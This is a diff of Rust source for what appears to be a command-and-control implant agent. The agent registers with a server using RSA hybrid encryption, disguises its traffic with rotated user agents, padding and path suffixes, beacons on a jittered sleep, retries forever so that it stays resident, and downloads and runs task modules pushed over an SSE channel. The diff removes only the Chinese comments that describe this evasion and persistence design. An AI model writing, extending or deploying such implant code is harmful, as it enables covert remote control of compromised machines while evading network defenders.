@@ -18,7 +18,6 @@ pub struct AgentEngine {
     agent_id: String,
     /// Per-session channel token issued at registration (rotates per session).
     session_token: String,
-    /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
     profile: Option<libra_common::models::ProfileTransform>,
 }
 
@@ -41,23 +40,14 @@ impl AgentEngine {
     // ── Main entry point ─────────────────────────────────────────────
 
     pub async fn run(&mut self) -> Result<(), String> {
-        // 注册/会话失败统一重试（指数退避 5s→10s→…→300s 封顶）：
-        // SESSION_LOST = 快速重注册（服务端密钥轮换/重启）；其他错误
-        // （服务端不可达/公钥失配 401 等）也绝不退出——agent 常驻是第一原则。
         let mut backoff_secs: u64 = 5;
         loop {
             match self.run_once().await {
-                // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
-                // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
-                // RSA keypair 保留——服务端若仍持有旧 session key 则复用，
-                // 否则重新下发（清 session key 强制协商）。
                 Err(e) if e == "SESSION_LOST" => {
                     libra_common::dlog!("[INFO] session lost — re-registering");
                     self.http = None;
                     self.session_token.clear();
                     self.profile = None;
-                    // 强制协商新会话密钥：服务端重启后其内存/Mongo 中的 key
-                    // 可能与 agent 持有的失配，保留旧 key 会死循环。
                     self.crypto.clear_session_key();
                     backoff_secs = 5;
                     continue;
@@ -91,14 +81,11 @@ impl AgentEngine {
             &self.config.result_path,
         );
 
-        // 构建时注入的流量伪装（UA/附加头/路径后缀）在注册前生效
-        // （注册请求本身也带伪装）；注册后服务端 profile 覆盖。
         http.set_build_style(
             self.config.user_agents.clone(),
             self.config.extra_headers.clone(),
             self.config.path_suffixes.clone(),
         );
-        // 服务端 RSA 公钥：注册混合加密
         if !self.config.server_public_key.is_empty() {
             http.set_server_public_key(self.config.server_public_key.clone());
         }
@@ -127,12 +114,10 @@ impl AgentEngine {
         let session_key = outcome.session_key;
         self.session_token = outcome.session_token.clone().unwrap_or_default();
 
-        // 采用单入口流量伪装 profile（路径/壳字段/UA/padding）
         if let Some(p) = outcome.profile {
             self.profile = Some(p.clone());
             http.set_profile(p);
         }
-        // 心跳节奏覆盖（服务端 profile 下发值优先于构建时值）
         if outcome.heartbeat_interval_ms > 0 {
             self.config.heartbeat_interval_ms = outcome.heartbeat_interval_ms;
         }
@@ -161,8 +146,6 @@ impl AgentEngine {
 
         self.main_loop().await
     }
-
-    // ── Main event loop（本体零 WS：wsNeeded 只驱动 realtime 模块）────
 
     async fn main_loop(&mut self) -> Result<(), String> {
         let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
@@ -194,7 +177,6 @@ impl AgentEngine {
         let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
-        // 主循环（SSE 重注册信号）仍要使用这些值：spawn 前各留一份副本
         let hb_agent_id = agent_id.clone();
         let hb_server_url = server_url.clone();
         let hb_register_path = register_path.clone();
@@ -225,15 +207,11 @@ impl AgentEngine {
                     _ => {}
                 }
 
-                // beacon sleep：块状抖动（普通 sleep，无镜像混淆）。
                 let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
                 tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
             }
         });
 
-        // ── SSE 任务事件流（唯一任务通道）──
-        // 长连接等待服务端推送任务；断线 3s 退避重连；SESSION_LOST → 重注册。
-        // 任务执行与心跳共用 handle_task（task.id 去重，双通道幂等）。
         let sse_mm = module_manager.clone();
         let sse_reconnect = reconnect_tx.clone();
         let sse_server_url = server_url.clone();
@@ -265,8 +243,6 @@ impl AgentEngine {
                     Ok(resp) => {
                         let mut stream = resp.bytes_stream();
                         let mut buf: Vec<u8> = Vec::with_capacity(4096);
-                        // 有界连接生命周期（5-15 分钟随机）：长连接有固定暴露窗口，
-                        // 主动轮换更接近"短会话"业务行为，也避免连接泄漏累积。
                         let lifetime =
                             std::time::Duration::from_secs(rand::thread_rng().gen_range(300..=900));
                         let start = std::time::Instant::now();
@@ -284,14 +260,12 @@ impl AgentEngine {
                                 }
                                 Ok(None) => break,
                                 Err(_) => {
-                                    // lifetime 到期：主动轮换连接
                                     libra_common::dlog!(
                                         "[sse] session lifetime reached — rotating"
                                     );
                                     break;
                                 }
                             }
-                            // 按行解析（chunk 可能跨行/多行）
                             while let Some(pos) = buf.iter().position(|&b| b == b'\n') {
                                 let line: Vec<u8> = buf.drain(..=pos).collect();
                                 let line = String::from_utf8_lossy(&line);
@@ -314,7 +288,6 @@ impl AgentEngine {
                                                         v["data"].clone()
                                                     ) {
                                                         Ok(task) => {
-                                                            // 并发执行：长任务（模块下载/执行）不阻塞后续任务。
                                                             let h = sse_http.clone();
                                                             let mm2 = sse_mm.clone();
                                                             let aid = sse_agent_id.clone();
@@ -340,7 +313,6 @@ impl AgentEngine {
                                         Err(e) => libra_common::dlog!("[sse] decrypt failed: {e}"),
                                     }
                                 }
-                                // 注释行（: ping）与空行忽略
                             }
                         }
                         libra_common::dlog!("[sse] stream ended — reconnecting");
@@ -356,8 +328,6 @@ impl AgentEngine {
             }
         });
 
-        // ── 主循环：等待重注册信号（SESSION_LOST）──
-        // 循环体所有分支都 return（有意挂起直到信号/退出），clippy never_loop 属误报
         #[allow(clippy::never_loop)]
         loop {
             tokio::select! {
